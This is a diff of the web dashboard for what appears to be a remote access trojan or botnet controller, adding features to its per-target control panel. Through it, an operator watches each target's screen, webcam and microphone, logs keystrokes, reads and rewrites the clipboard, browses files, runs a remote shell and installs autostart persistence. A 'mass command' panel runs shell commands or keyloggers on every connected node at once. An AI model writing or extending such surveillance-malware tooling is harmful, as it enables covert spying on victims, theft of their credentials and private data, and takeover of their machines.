+          <div id="stream-placeholder" style="color:var(--dim);font-size:12px;padding:40px;text-align:center;">Stream stopped — click START</div>
         </div>
         <div class="stream-toolbar">
-          <button class="btn btn-green" id="btn-stream-start" onclick="startStream()">▶ START STREAM</button>
-          <button class="btn btn-red" id="btn-stream-stop" onclick="stopStream()" disabled>■ STOP</button>
-          <button class="btn btn-blue" onclick="takeScreenshot()">📷 SCREENSHOT</button>
-          <button class="btn btn-warn" onclick="sendAlert()">⚠ ALERT</button>
-          <button class="btn btn-warn" onclick="sendCmd('lock_screen')">🔒 LOCK</button>
-          <button class="btn btn-blue" onclick="openUrl()">🌐 OPEN URL</button>
-          <label style="display:flex;align-items:center;gap:6px;font-size:11px;color:var(--dim);cursor:pointer;">
-            <input type="checkbox" id="remote-ctrl-toggle" onchange="toggleRemoteCtrl(this.checked)">
-            REMOTE CONTROL
+          <button class="btn btn-green btn-sm" id="btn-stream-start" onclick="startStream()">▶ START</button>
+          <button class="btn btn-red btn-sm" id="btn-stream-stop" onclick="stopStream()" disabled>■ STOP</button>
+          <button class="btn btn-blue btn-sm" onclick="takeScreenshot()">📷 SNAP</button>
+          <button class="btn btn-warn btn-sm" onclick="sendAlert()">⚠ ALERT</button>
+          <button class="btn btn-warn btn-sm" onclick="sendCmd('lock_screen')">🔒 LOCK</button>
+          <button class="btn btn-blue btn-sm" onclick="openUrl()">🌐 URL</button>
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--dim);cursor:pointer;">
+            <input type="checkbox" id="remote-ctrl-toggle" onchange="toggleRemoteCtrl(this.checked)"> REMOTE CTRL
           </label>
           <span class="stream-status" id="stream-status">IDLE</span>
         </div>
       </div>
 
-      <!-- SHELL TAB -->
+      <!-- WEBCAM -->
+      <div class="tab-content" id="tab-webcam">
+        <div class="stream-wrapper" id="webcam-wrapper">
+          <img id="webcam-img" src="" alt="" style="display:none;">
+          <div id="webcam-placeholder" style="color:var(--dim);font-size:12px;padding:40px;text-align:center;">Click SNAP or START STREAM</div>
+        </div>
+        <div class="stream-toolbar">
+          <button class="btn btn-green btn-sm" onclick="webcamSnap()">📸 SNAP</button>
+          <button class="btn btn-green btn-sm" id="btn-wcam-start" onclick="startWebcam()">▶ STREAM</button>
+          <button class="btn btn-red btn-sm" id="btn-wcam-stop" onclick="stopWebcam()" disabled>■ STOP</button>
+          <span class="stream-status" id="webcam-status">IDLE</span>
+        </div>
+      </div>
+
+      <!-- SHELL -->
       <div class="tab-content" id="tab-shell">
-        <div class="shell-output" id="shell-output"><span style="color:var(--dim);font-size:12px;">// Remote shell ready. Type a command below.</span><br></div>
+        <div class="shell-output" id="shell-output"><span style="color:var(--dim);">// Remote shell — type below</span><br></div>
         <div class="shell-input-row">
           <span>$</span>
           <input class="shell-input" id="shell-input" type="text" placeholder="command..." autocomplete="off" onkeydown="shellKeyDown(event)">
@@ -302,33 +332,49 @@ input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4)
         </div>
       </div>
 
-      <!-- KEYLOG TAB -->
+      <!-- KEYLOG -->
       <div class="tab-content" id="tab-keylog">
-        <div class="keylog-output" id="keylog-output"><span style="color:var(--dim);">// Keylogger output will appear here in real-time...</span></div>
+        <div class="keylog-output" id="keylog-output"><span style="color:var(--dim);">// Keylogger output...</span></div>
         <div class="keylog-controls">
-          <button class="btn btn-green" id="btn-kl-start" onclick="startKeylog()">▶ START</button>
-          <button class="btn btn-red" id="btn-kl-stop" onclick="stopKeylog()" disabled>■ STOP</button>
-          <button class="btn btn-warn" onclick="clearKeylog()">CLR</button>
-          <span id="kl-status" style="font-size:11px;color:var(--dim);margin-left:8px;">IDLE</span>
+          <button class="btn btn-green btn-sm" id="btn-kl-start" onclick="startKeylog()">▶ START</button>
+          <button class="btn btn-red btn-sm" id="btn-kl-stop" onclick="stopKeylog()" disabled>■ STOP</button>
+          <button class="btn btn-warn btn-sm" onclick="clearKeylog()">CLR</button>
+          <button class="btn btn-blue btn-sm" onclick="copyKeylog()">COPY ALL</button>
+          <span id="kl-status" style="font-size:10px;color:var(--dim);margin-left:6px;">IDLE</span>
         </div>
       </div>
 
-      <!-- CLIPBOARD TAB -->
+      <!-- MIC -->
+      <div class="tab-content" id="tab-mic">
+        <div class="mic-area" id="mic-area">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
+            <span style="font-size:11px;color:var(--dim);">Duration:</span>
+            <input type="number" id="mic-duration" value="10" min="1" max="120" style="width:60px;">
+            <span style="font-size:11px;color:var(--dim);">seconds</span>
+            <button class="btn btn-green btn-sm" id="btn-mic-rec" onclick="startMic()">🎙 RECORD</button>
+            <button class="btn btn-red btn-sm" onclick="stopMic()">■ STOP</button>
+            <span id="mic-status" style="font-size:10px;color:var(--dim);">IDLE</span>
+          </div>
+          <div id="mic-recordings"></div>
+        </div>
+      </div>
+
+      <!-- CLIPBOARD -->
       <div class="tab-content" id="tab-clipboard">
         <div class="clip-area">
-          <div style="font-size:10px;letter-spacing:2px;color:var(--dim);margin-bottom:8px;text-transform:uppercase;">Current Clipboard</div>
+          <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;">Current Clipboard</div>
           <div class="clip-display" id="clip-display">—</div>
-          <div style="display:flex;gap:8px;margin-bottom:16px;">
-            <button class="btn btn-green btn-sm" onclick="getClipboard()">↓ GET CLIPBOARD</button>
+          <div style="display:flex;gap:7px;margin-bottom:14px;">
+            <button class="btn btn-green btn-sm" onclick="getClipboard()">↓ GET</button>
             <button class="btn btn-blue btn-sm" onclick="copyClipDisplay()">COPY</button>
           </div>
-          <div style="font-size:10px;letter-spacing:2px;color:var(--dim);margin-bottom:8px;text-transform:uppercase;">Set Clipboard</div>
-          <textarea class="clip-input" id="clip-input" placeholder="Text to set on target..."></textarea>
-          <button class="btn btn-warn btn-sm" onclick="setClipboard()">↑ SET ON TARGET</button>
+          <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;">Set Clipboard</div>
+          <textarea class="clip-input" id="clip-input" placeholder="Text to push to target..."></textarea>
+          <button class="btn btn-warn btn-sm" onclick="setClipboard()">↑ PUSH</button>
         </div>
       </div>
 
-      <!-- FILES TAB -->
+      <!-- FILES -->
       <div class="tab-content" id="tab-files">
         <div class="fb-nav">
           <button class="btn btn-blue btn-sm" onclick="fbUp()">↑ UP</button>
@@ -336,39 +382,112 @@ input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4)
           <input class="fb-path" id="fb-path" type="text" placeholder="/path/to/browse" onkeydown="if(event.key==='Enter')fbNavigate()">
           <button class="btn btn-green btn-sm" onclick="fbNavigate()">GO</button>
         </div>
-        <div class="fb-header" style="padding-left:20px;">
-          <div style="width:16px;"></div>
+        <div class="fb-colhdr">
+          <div style="width:14px;"></div>
           <div style="flex:1;">Name</div>
-          <div style="min-width:70px;text-align:right;">Size</div>
-          <div style="min-width:115px;text-align:right;margin-right:5px;">Modified</div>
-          <div style="width:100px;"></div>
+          <div style="min-width:65px;text-align:right;">Size</div>
+          <div style="min-width:110px;text-align:right;margin-right:5px;">Modified</div>
+          <div style="min-width:80px;"></div>
         </div>
-        <div class="fb-list" id="fb-list">
-          <div class="no-data">Click HOME or enter a path to browse</div>
+        <div class="fb-list" id="fb-list"><div class="no-data">Click HOME or type a path</div></div>
+      </div>
+
+      <!-- NETWORK -->
+      <div class="tab-content" id="tab-network">
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
+          <button class="btn btn-green btn-sm" onclick="getNetinfo()">↻ REFRESH</button>
+        </div>
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:14px 18px;" id="net-content">
+          <div class="no-data">Click REFRESH</div>
         </div>
       </div>
 
-      <!-- SYSINFO TAB -->
+      <!-- SYSINFO -->
       <div class="tab-content" id="tab-sysinfo">
-        <div style="flex-shrink:0;padding:10px 20px;border-bottom:1px solid var(--border);">
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
           <button class="btn btn-green btn-sm" onclick="getSysinfo()">↻ REFRESH</button>
         </div>
-        <div style="flex:1;min-height:0;overflow-y:auto;padding:16px 20px;">
-          <div id="sysinfo-content" class="no-data">Click REFRESH to load system info</div>
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:14px 18px;">
+          <div id="sysinfo-content" class="no-data">Click REFRESH</div>
         </div>
       </div>
 
-      <!-- PROCESSES TAB -->
+      <!-- PROCESSES -->
       <div class="tab-content" id="tab-processes">
-        <div style="flex-shrink:0;padding:10px 20px;border-bottom:1px solid var(--border);">
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
           <button class="btn btn-green btn-sm" onclick="getProcesses()">↻ REFRESH</button>
+          <input type="text" id="proc-filter" placeholder="filter..." style="width:120px;" oninput="filterProcs()">
         </div>
-        <div style="flex:1;min-height:0;overflow-y:auto;padding:0 20px 16px;">
-          <div id="proc-content" class="no-data">Click REFRESH to load processes</div>
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:0 0 12px;">
+          <div id="proc-content" class="no-data">Click REFRESH</div>
         </div>
       </div>
 
-    </div><!-- /modal-body -->
+      <!-- AUTO SCREENSHOTS -->
+      <div class="tab-content" id="tab-autoshots">
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+          <span style="font-size:10px;color:var(--dim);">INTERVAL:</span>
+          <input type="number" id="ss-interval" value="30" min="5" max="300" style="width:60px;">
+          <span style="font-size:10px;color:var(--dim);">sec</span>
+          <button class="btn btn-green btn-sm" id="btn-ss-start" onclick="startAutoSS()">▶ START</button>
+          <button class="btn btn-red btn-sm" id="btn-ss-stop" onclick="stopAutoSS()" disabled>■ STOP</button>
+          <button class="btn btn-warn btn-sm" onclick="clearAutoSS()">CLR</button>
+          <span id="ss-status" style="font-size:10px;color:var(--dim);">IDLE</span>
+        </div>
+        <div class="ss-gallery" id="ss-gallery"><div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div></div>
+      </div>
+
+      <!-- CHAT -->
+      <div class="tab-content" id="tab-chat">
+        <div class="chat-messages" id="chat-messages">
+          <div class="no-data">Send a message — it will pop up as a notification on the target</div>
+        </div>
+        <div class="chat-input-row">
+          <input class="chat-input" id="chat-input" type="text" placeholder="Message to display on target..." onkeydown="if(event.key==='Enter')sendChat()">
+          <button class="btn btn-green btn-sm" onclick="sendChat()">SEND</button>
+        </div>
+      </div>
+
+      <!-- PERSIST -->
+      <div class="tab-content" id="tab-persist">
+        <div class="persist-area">
+          <div style="margin-bottom:20px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
+            <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚠ PERSISTENCE</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Registry Run key · macOS: LaunchAgent · Linux: Systemd user service</div>
+          </div>
+          <div style="display:flex;gap:10px;margin-bottom:20px;">
+            <button class="btn btn-warn" onclick="persistInstall()">⚙ INSTALL AUTOSTART</button>
+            <button class="btn btn-red" onclick="persistRemove()">✕ REMOVE AUTOSTART</button>
+          </div>
+          <div id="persist-result" style="font-size:12px;color:var(--dim);"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ══ MASS CMD MODAL ══ -->
+<div class="modal-overlay" id="mass-overlay">
+  <div class="modal" style="max-width:700px;height:70vh;">
+    <div class="modal-header">
+      <span class="modal-title">MASS COMMAND</span>
+      <button class="modal-close" onclick="document.getElementById('mass-overlay').classList.remove('open')">✕</button>
+    </div>
+    <div style="flex-shrink:0;padding:12px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+      <select id="mass-action">
+        <option value="shell">Shell Command</option>
+        <option value="alert">Alert Popup</option>
+        <option value="lock_screen">Lock Screen</option>
+        <option value="open_url">Open URL</option>
+        <option value="keylog_start">Start Keylogger</option>
+        <option value="keylog_stop">Stop Keylogger</option>
+        <option value="screenshot">Screenshot</option>
+      </select>
+      <input type="text" id="mass-param" placeholder="command / message / URL..." style="flex:1;min-width:150px;">
+      <button class="btn btn-warn" onclick="runMassCmd()">⚡ EXECUTE ALL</button>
+    </div>
+    <div class="mass-area" id="mass-results"></div>
   </div>
 </div>
 
@@ -377,449 +496,546 @@ const socket = io();
 let clients = [];
 let selectedClient = null;
 let streaming = false;
+let webcamStreaming = false;
 let remoteCtrl = false;
 let keylogging = false;
+let autoSS = false;
 let fbCurrentPath = '';
-let pendingCmds = {}; // rid -> resolve
+let shellHistory = [];
+let shellHistIdx = -1;
+let pendingCmds = {};
+let allProcs = [];
 
 // ── Clock ──
 function clock(){ document.getElementById('clock').textContent = new Date().toTimeString().slice(0,8); }
 setInterval(clock,1000); clock();
 
 // ── Socket ──
-socket.on('connect', () => {
-  addLog('Dashboard connected','info');
-  socket.emit('dashboard_join');
-});
-socket.on('disconnect', () => addLog('Lost connection to server','disconnect'));
-socket.on('client_update', data => renderClients(data.clients || []));
+socket.on('connect', () => { addLog('Dashboard connected','info'); socket.emit('dashboard_join'); });
+socket.on('disconnect', () => addLog('Lost connection','disconnect'));
+socket.on('client_update', data => renderClients(data.clients||[]));
+
 socket.on('screen_frame', data => {
-  if(selectedClient && data.client_id === selectedClient.id && streaming){
-    const img = document.getElementById('screen-img');
-    img.src = 'data:image/jpeg;base64,' + data.frame;
-    img.style.display = 'block';
-    document.getElementById('stream-placeholder').style.display = 'none';
-    document.getElementById('stream-status').textContent = new Date().toTimeString().slice(0,8);
-  }
+  if(!selectedClient || data.client_id !== selectedClient.id || !streaming) return;
+  const img = document.getElementById('screen-img');
+  img.src = 'data:image/jpeg;base64,'+data.frame;
+  img.style.display = 'block';
+  document.getElementById('stream-placeholder').style.display = 'none';
+  document.getElementById('stream-status').textContent = new Date().toTimeString().slice(0,8);
 });
+
+socket.on('webcam_frame', data => {
+  if(!selectedClient || data.client_id !== selectedClient.id || !webcamStreaming) return;
+  const img = document.getElementById('webcam-img');
+  img.src = 'data:image/jpeg;base64,'+data.frame;
+  img.style.display = 'block';
+  document.getElementById('webcam-placeholder').style.display = 'none';
+  document.getElementById('webcam-status').textContent = new Date().toTimeString().slice(0,8);
+});
+
 socket.on('keylog_data', data => {
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   const out = document.getElementById('keylog-output');
-  if(out.firstChild && out.firstChild.tagName === 'SPAN' && out.children.length === 1) out.innerHTML = '';
-  // Strip any [HH:MM:SS] timestamps that may come from old clients
+  if(out.querySelector('span') && out.children.length === 1 && out.textContent.includes('//')) out.innerHTML = '';
   let text = data.data.replace(/\[\d{2}:\d{2}:\d{2}\]\s*/g, '');
-  // Highlight special keys like [Enter], [BackSpace] etc in orange
   text = text.replace(/\[([A-Za-z_]+)\]/g, '<span class="kl-special">[$1]</span>');
   out.innerHTML += text;
   out.scrollTop = out.scrollHeight;
 });
-socket.on('cmd_response', data => {
-  if(pendingCmds[data.rid]){
-    pendingCmds[data.rid](data);
-    delete pendingCmds[data.rid];
-  }
+
+socket.on('mic_data', data => {
+  if(!selectedClient || data.client_id !== selectedClient.id) return;
+  document.getElementById('mic-status').textContent = 'RECEIVED';
+  document.getElementById('mic-status').style.color = 'var(--accent)';
+  const blob = b64toBlob(data.data, 'audio/wav');
+  const url = URL.createObjectURL(blob);
+  const ts = new Date().toTimeString().slice(0,8);
+  const div = document.createElement('div');
+  div.className = 'audio-item';
+  div.innerHTML = `<span style="color:var(--dim);font-size:10px;min-width:60px;">${ts}</span>
+    <audio controls src="${url}"></audio>
+    <a href="${url}" download="mic_${ts.replace(/:/g,'')}.wav" class="btn btn-blue btn-sm">DL</a>`;
+  document.getElementById('mic-recordings').prepend(div);
 });
 
-// ── Command helper ──
-function sendCmdRaw(action, extra = {}){
+socket.on('auto_screenshot', data => {
+  if(!selectedClient || data.client_id !== selectedClient.id || !autoSS) return;
+  const gallery = document.getElementById('ss-gallery');
+  const noData = gallery.querySelector('.no-data');
+  if(noData) noData.remove();
+  const div = document.createElement('div');
+  div.className = 'ss-thumb';
+  div.innerHTML = `<img src="data:image/jpeg;base64,${data.data}" onclick="expandImg(this.src)">
+    <div class="ss-info">${data.ts}</div>`;
+  gallery.prepend(div);
+  // Keep max 30
+  while(gallery.children.length > 30) gallery.removeChild(gallery.lastChild);
+  document.getElementById('ss-status').textContent = 'LAST: '+data.ts;
+});
+
+socket.on('cmd_response', data => {
+  if(pendingCmds[data.rid]){ pendingCmds[data.rid](data); delete pendingCmds[data.rid]; }
+});
+
+// ── Command helpers ──
+function sendCmdRaw(action, extra={}){
   return new Promise(resolve => {
     if(!selectedClient){ resolve({status:'error',msg:'No client'}); return; }
     const rid = Math.random().toString(36).slice(2);
     pendingCmds[rid] = resolve;
-    socket.emit('cmd', { client_id: selectedClient.id, action, rid, ...extra });
-    setTimeout(() => {
-      if(pendingCmds[rid]){ delete pendingCmds[rid]; resolve({status:'error',msg:'Timeout'}); }
-    }, 20000);
+    socket.emit('cmd', {client_id:selectedClient.id, action, rid, ...extra});
+    setTimeout(()=>{ if(pendingCmds[rid]){ delete pendingCmds[rid]; resolve({status:'error',msg:'Timeout'}); }},20000);
   });
 }
-function sendCmd(action, extra = {}){
+function sendCmd(action, extra={}){
   if(!selectedClient) return;
-  socket.emit('cmd', { client_id: selectedClient.id, action, rid: '', ...extra });
+  socket.emit('cmd', {client_id:selectedClient.id, action, rid:'', ...extra});
 }
 
-// ── Render node list ──
+// ── Render ──
 function renderClients(data){
   const prev = Object.fromEntries(clients.map(c=>[c.id,c.status]));
   clients = data;
-  // Update selected client
-  if(selectedClient){ selectedClient = clients.find(c=>c.id===selectedClient.id) || null; }
-
-  data.forEach(c => {
+  if(selectedClient) selectedClient = clients.find(c=>c.id===selectedClient.id)||null;
+  data.forEach(c=>{
     const was = prev[c.id];
     if(!was) addLog(`NEW: ${c.hostname} (${c.ip})`,'connect');
     else if(was==='online'&&c.status==='offline') addLog(`OFFLINE: ${c.hostname}`,'disconnect');
     else if(was==='offline'&&c.status==='online') addLog(`ONLINE: ${c.hostname}`,'connect');
   });
-
+  const online = data.filter(c=>c.status==='online').length;
   document.getElementById('stat-total').textContent = data.length;
-  document.getElementById('stat-online').textContent = data.filter(c=>c.status==='online').length;
-  document.getElementById('stat-offline').textContent = data.filter(c=>c.status==='offline').length;
+  document.getElementById('stat-online').textContent = online;
+  document.getElementById('stat-offline').textContent = data.length - online;
+  document.getElementById('sb-count').textContent = online;
   document.getElementById('last-update').textContent = 'UPDATED '+new Date().toTimeString().slice(0,8);
-
-  // Sidebar
   const nl = document.getElementById('node-list');
-  if(!data.length){
-    nl.innerHTML = '<div class="empty-sidebar">No nodes connected<br>Awaiting signal...</div>';
-  } else {
-    nl.innerHTML = data.map(c=>`
-      <div class="node-item${selectedClient&&selectedClient.id===c.id?' selected':''}" onclick="selectNode('${c.id}')">
+  nl.innerHTML = !data.length ? '<div class="empty-sidebar">No nodes<br>Awaiting signal...</div>'
+    : data.map(c=>`<div class="node-item${selectedClient&&selectedClient.id===c.id?' selected':''}" onclick="selectNode('${c.id}')">
         <div class="nh">${esc(c.hostname)}</div>
         <div class="nu">${esc(c.username)} · ${esc(c.ip)}</div>
         <div class="nb"><span class="node-dot ${c.status}"></span></div>
       </div>`).join('');
-  }
-
-  // Table
   const tc = document.getElementById('table-container');
-  if(!data.length){
-    tc.innerHTML = '<div class="no-data">⬡ NO NODES — AWAITING SIGNAL</div>';
-  } else {
-    tc.innerHTML = `<table><thead><tr>
-      <th>Hostname</th><th>IP</th><th>Username</th><th>Platform</th><th>Connected</th><th>Status</th><th>Actions</th>
-    </tr></thead><tbody>${data.map(c=>`<tr>
-      <td class="hostname">${esc(c.hostname)}</td>
-      <td style="font-size:11px;color:var(--dim)">${esc(c.ip)}</td>
-      <td>${esc(c.username)}</td>
-      <td><span class="platform-badge">${esc(c.platform)}</span></td>
-      <td style="font-size:11px;color:var(--dim)">${new Date(c.connected_at).toTimeString().slice(0,8)}</td>
-      <td><span class="status-badge ${c.status}">${c.status.toUpperCase()}</span></td>
-      <td><button class="btn btn-green btn-sm" onclick="openNode('${c.id}')">CONTROL</button></td>
-    </tr>`).join('')}</tbody></table>`;
-  }
+  tc.innerHTML = !data.length ? '<div class="no-data">⬡ NO NODES</div>'
+    : `<table><thead><tr><th>Hostname</th><th>IP</th><th>User</th><th>Platform</th><th>Connected</th><th>Status</th><th></th></tr></thead>
+      <tbody>${data.map(c=>`<tr>
+        <td class="hostname">${esc(c.hostname)}</td>
+        <td style="font-size:10px;color:var(--dim)">${esc(c.ip)}</td>
+        <td>${esc(c.username)}</td>
+        <td><span class="platform-badge">${esc(c.platform)}</span></td>
+        <td style="font-size:10px;color:var(--dim)">${new Date(c.connected_at).toTimeString().slice(0,8)}</td>
+        <td><span class="status-badge ${c.status}">${c.status.toUpperCase()}</span></td>
+        <td><button class="btn btn-green btn-sm" onclick="openNode('${c.id}')">CONTROL</button></td>
+      </tr>`).join('')}</tbody></table>`;
 }
 
-// ── Node selection / modal ──
-function selectNode(id){
-  selectedClient = clients.find(c=>c.id===id) || null;
-  renderClients(clients);
-}
-
+// ── Modal ──
+function selectNode(id){ selectedClient = clients.find(c=>c.id===id)||null; renderClients(clients); }
 function openNode(id){
   selectNode(id);
-  document.getElementById('modal-title').textContent = selectedClient ? selectedClient.hostname.toUpperCase() : 'NODE';
+  if(!selectedClient) return;
+  document.getElementById('modal-title').textContent = selectedClient.hostname.toUpperCase();
+  document.getElementById('modal-subtitle').textContent = selectedClient.ip+' · '+selectedClient.username;
   document.getElementById('modal-overlay').classList.add('open');
   switchTab('screen');
 }
-
 function closeModal(){
   document.getElementById('modal-overlay').classList.remove('open');
   if(streaming) stopStream();
+  if(webcamStreaming) stopWebcam();
 }
-
-// Close on backdrop click
-document.getElementById('modal-overlay').addEventListener('click', e => {
-  if(e.target === document.getElementById('modal-overlay')) closeModal();
-});
-
-// ── Tabs ──
-document.querySelectorAll('.tab-btn').forEach(btn => {
-  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
-});
+document.getElementById('modal-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('modal-overlay')) closeModal(); });
+document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',()=>switchTab(btn.dataset.tab)));
 function switchTab(name){
-  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('active', b.dataset.tab===name));
-  document.querySelectorAll('.tab-content').forEach(t=>t.classList.toggle('active', t.id==='tab-'+name));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('active',b.dataset.tab===name));
+  document.querySelectorAll('.tab-content').forEach(t=>t.classList.toggle('active',t.id==='tab-'+name));
 }
 
 // ── Stream ──
 function startStream(){
   if(!selectedClient) return;
   streaming = true;
-  socket.emit('start_stream', {client_id: selectedClient.id});
-  document.getElementById('btn-stream-start').disabled = true;
-  document.getElementById('btn-stream-stop').disabled = false;
-  document.getElementById('stream-status').textContent = 'STREAMING...';
+  socket.emit('start_stream',{client_id:selectedClient.id});
+  document.getElementById('btn-stream-start').disabled=true;
+  document.getElementById('btn-stream-stop').disabled=false;
+  document.getElementById('stream-status').textContent='STREAMING...';
 }
 function stopStream(){
   if(!selectedClient) return;
   streaming = false;
-  socket.emit('stop_stream', {client_id: selectedClient.id});
-  document.getElementById('btn-stream-start').disabled = false;
-  document.getElementById('btn-stream-stop').disabled = true;
-  document.getElementById('stream-status').textContent = 'STOPPED';
+  socket.emit('stop_stream',{client_id:selectedClient.id});
+  document.getElementById('btn-stream-start').disabled=false;
+  document.getElementById('btn-stream-stop').disabled=true;
+  document.getElementById('stream-status').textContent='STOPPED';
   document.getElementById('screen-img').style.display='none';
   document.getElementById('stream-placeholder').style.display='';
 }
 
 // ── Remote control ──
 function toggleRemoteCtrl(on){
-  remoteCtrl = on;
-  const img = document.getElementById('screen-img');
-  if(on){
-    img.addEventListener('mousemove', onRemoteMouseMove);
-    img.addEventListener('click', onRemoteMouseClick);
-    img.addEventListener('contextmenu', onRemoteRightClick);
-  } else {
-    img.removeEventListener('mousemove', onRemoteMouseMove);
-    img.removeEventListener('click', onRemoteMouseClick);
-    img.removeEventListener('contextmenu', onRemoteRightClick);
-  }
+  remoteCtrl=on;
+  const img=document.getElementById('screen-img');
+  if(on){ img.addEventListener('mousemove',onRMM); img.addEventListener('click',onRMC); img.addEventListener('contextmenu',onRRC); }
+  else { img.removeEventListener('mousemove',onRMM); img.removeEventListener('click',onRMC); img.removeEventListener('contextmenu',onRRC); }
 }
-function getImgCoords(e){
-  const rect = e.target.getBoundingClientRect();
-  return { x: Math.round(e.clientX - rect.left), y: Math.round(e.clientY - rect.top) };
-}
-function onRemoteMouseMove(e){
-  if(!streaming||!selectedClient) return;
-  const p = getImgCoords(e);
-  socket.emit('mouse_move', {client_id: selectedClient.id, ...p});
-}
-function onRemoteMouseClick(e){
-  if(!selectedClient) return;
-  const p = getImgCoords(e);
-  socket.emit('mouse_click', {client_id: selectedClient.id, ...p, button:'left'});
-}
-function onRemoteRightClick(e){
-  e.preventDefault();
-  if(!selectedClient) return;
-  const p = getImgCoords(e);
-  socket.emit('mouse_click', {client_id: selectedClient.id, ...p, button:'right'});
-}
-document.addEventListener('keydown', e => {
-  if(!remoteCtrl || !selectedClient) return;
-  if(document.activeElement !== document.body && document.activeElement.tagName !== 'IMG') return;
-  socket.emit('key_press', {client_id: selectedClient.id, key: e.key});
+function getImgXY(e){ const r=e.target.getBoundingClientRect(); return{x:Math.round(e.clientX-r.left),y:Math.round(e.clientY-r.top)}; }
+function onRMM(e){ if(!streaming||!selectedClient)return; socket.emit('mouse_move',{client_id:selectedClient.id,...getImgXY(e)}); }
+function onRMC(e){ if(!selectedClient)return; socket.emit('mouse_click',{client_id:selectedClient.id,...getImgXY(e),button:'left'}); }
+function onRRC(e){ e.preventDefault(); if(!selectedClient)return; socket.emit('mouse_click',{client_id:selectedClient.id,...getImgXY(e),button:'right'}); }
+document.addEventListener('keydown',e=>{
+  if(!remoteCtrl||!selectedClient) return;
+  if(document.activeElement!==document.body&&document.activeElement.tagName!=='IMG') return;
+  socket.emit('key_press',{client_id:selectedClient.id,key:e.key});
 });
 
 // ── Screenshot ──
 async function takeScreenshot(){
   if(!selectedClient) return;
   const res = await sendCmdRaw('screenshot');
-  if(res.status==='ok'){
-    const w = window.open('');
-    w.document.write(`<img src="data:image/jpeg;base64,${res.data}" style="max-width:100%">`);
-  } else { alert('Error: '+res.msg); }
+  if(res.status==='ok') expandImg('data:image/jpeg;base64,'+res.data);
+  else addLog('Screenshot failed: '+res.msg,'error');
 }
+function expandImg(src){ const w=window.open('','_blank','width=900,height=600'); w.document.write(`<body style="margin:0;background:#000"><img src="${src}" style="max-width:100%;display:block;"></body>`); }
 
 // ── Alert/Lock/URL ──
-function sendAlert(){
-  const msg = prompt('Alert message to show on target:');
-  if(msg) sendCmd('alert', {msg});
+function sendAlert(){ const m=prompt('Alert message:'); if(m) sendCmd('alert',{msg:m}); }
+function openUrl(){ const u=prompt('URL to open:','https://'); if(u) sendCmd('open_url',{url:u}); }
+
+// ── Webcam ──
+async function webcamSnap(){
+  if(!selectedClient) return;
+  document.getElementById('webcam-status').textContent='Capturing...';
+  const res = await sendCmdRaw('webcam_snap');
+  if(res.status==='ok'){
+    const img=document.getElementById('webcam-img');
+    img.src='data:image/jpeg;base64,'+res.data;
+    img.style.display='block';
+    document.getElementById('webcam-placeholder').style.display='none';
+    document.getElementById('webcam-status').textContent=new Date().toTimeString().slice(0,8);
+  } else { document.getElementById('webcam-status').textContent='Error: '+res.msg; }
 }
-function openUrl(){
-  const url = prompt('URL to open on target:','https://');
-  if(url) sendCmd('open_url', {url});
+function startWebcam(){
+  if(!selectedClient) return;
+  webcamStreaming=true;
+  sendCmd('webcam_stream_start');
+  document.getElementById('btn-wcam-start').disabled=true;
+  document.getElementById('btn-wcam-stop').disabled=false;
+  document.getElementById('webcam-status').textContent='STREAMING...';
+}
+function stopWebcam(){
+  webcamStreaming=false;
+  sendCmd('webcam_stream_stop');
+  document.getElementById('btn-wcam-start').disabled=false;
+  document.getElementById('btn-wcam-stop').disabled=true;
+  document.getElementById('webcam-status').textContent='STOPPED';
 }
 
 // ── Shell ──
 function shellKeyDown(e){
-  if(e.key === 'Enter') runShell();
+  if(e.key==='Enter'){ runShell(); }
+  else if(e.key==='ArrowUp'){ e.preventDefault(); if(shellHistIdx<shellHistory.length-1){ shellHistIdx++; document.getElementById('shell-input').value=shellHistory[shellHistory.length-1-shellHistIdx]||''; } }
+  else if(e.key==='ArrowDown'){ e.preventDefault(); if(shellHistIdx>0){ shellHistIdx--; document.getElementById('shell-input').value=shellHistory[shellHistory.length-1-shellHistIdx]||''; } else { shellHistIdx=-1; document.getElementById('shell-input').value=''; } }
 }
 async function runShell(){
-  const inp = document.getElementById('shell-input');
-  const cmd = inp.value.trim();
-  if(!cmd || !selectedClient) return;
-  inp.value = '';
-  const out = document.getElementById('shell-output');
-  out.innerHTML += `<span class="shell-prompt">$ ${esc(cmd)}</span>\n`;
-  out.scrollTop = out.scrollHeight;
-  const res = await sendCmdRaw('shell', {cmd});
+  const inp=document.getElementById('shell-input');
+  const cmd=inp.value.trim();
+  if(!cmd||!selectedClient) return;
+  shellHistory.push(cmd); shellHistIdx=-1;
+  inp.value='';
+  const out=document.getElementById('shell-output');
